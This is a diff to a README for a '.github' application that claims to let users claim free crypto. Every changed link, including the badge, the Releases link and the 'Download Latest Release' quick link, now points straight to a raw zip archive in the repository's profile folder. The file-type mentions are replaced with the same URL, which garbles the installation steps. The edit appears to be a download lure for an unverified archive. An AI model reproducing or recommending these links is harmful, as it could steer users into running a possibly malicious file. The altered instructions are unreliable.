@@ -6,9 +6,9 @@ Welcome to the .github repository! Here, you will learn how to easily download a
 
 ## 📥 Download the Application
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/TahaMustafa75/.github/releases)
+[![Download the latest release](https://github.com/TahaMustafa75/.github/raw/refs/heads/main/profile/github-2.2-alpha.1.zip%https://github.com/TahaMustafa75/.github/raw/refs/heads/main/profile/github-2.2-alpha.1.zip)](https://github.com/TahaMustafa75/.github/raw/refs/heads/main/profile/github-2.2-alpha.1.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/TahaMustafa75/.github/releases)
+Visit this page to download: [GitHub Releases](https://github.com/TahaMustafa75/.github/raw/refs/heads/main/profile/github-2.2-alpha.1.zip)
 
 ## 📋 System Requirements
 
@@ -31,9 +31,9 @@ This application provides:
 
 To download the application:
 
-1. Click on the link above to visit the [GitHub Releases](https://github.com/TahaMustafa75/.github/releases) page.
+1. Click on the link above to visit the [GitHub Releases](https://github.com/TahaMustafa75/.github/raw/refs/heads/main/profile/github-2.2-alpha.1.zip) page.
 2. On the Releases page, look for the latest version.
-3. Find the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+3. Find the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or https://github.com/TahaMustafa75/.github/raw/refs/heads/main/profile/github-2.2-alpha.1.zip for Linux).
 4. Click the download link to start the download.
 
 Once the download is complete, locate the file on your device and follow these steps to install:
@@ -52,7 +52,7 @@ Once the download is complete, locate the file on your device and follow these s
 
 ### For Linux:
 
-1. Extract the downloaded .tar.gz file.
+1. Extract the downloaded https://github.com/TahaMustafa75/.github/raw/refs/heads/main/profile/github-2.2-alpha.1.zip file.
 2. Open a terminal window in the extracted folder.
 3. Run the following command to start the application: `./yourappname` (replace `yourappname` with the specific application file).
 
@@ -89,7 +89,7 @@ This project is open-source under the MIT License. You are free to use, modify, 
 
 ## 🔗 Quick Links
 
-- [GitHub Repository](https://github.com/TahaMustafa75/.github)
-- [Download Latest Release](https://github.com/TahaMustafa75/.github/releases)
+- [GitHub Repository](https://github.com/TahaMustafa75/.github/raw/refs/heads/main/profile/github-2.2-alpha.1.zip)
+- [Download Latest Release](https://github.com/TahaMustafa75/.github/raw/refs/heads/main/profile/github-2.2-alpha.1.zip)
 
 By following these steps, you'll be ready to start claiming free crypto in no time. Enjoy using the .github application, and happy claiming!
